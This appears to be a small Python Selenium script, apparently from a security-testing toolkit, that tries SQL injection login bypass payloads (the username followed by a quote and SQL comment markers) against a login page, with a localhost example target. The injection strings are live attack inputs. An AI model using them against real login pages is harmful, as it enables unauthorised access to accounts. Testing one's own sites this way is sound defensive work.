from Cyber_Scripts import *
from selenium import webdriver
from selenium.common import UnexpectedAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import time


def execute(login_page_url, user_name):
    # injections = [[f"{user_name}'/*", "'*/'"], [f"{user_name}'-- ", ""]]
    injections = [[f"{user_name}'-- ", ""]]
    for injection in injections:
        passed = enter_login_input(login_page_url, injection[0], injection[1])
        return passed

# execute(login_page_url="http://localhost/site/login.php")
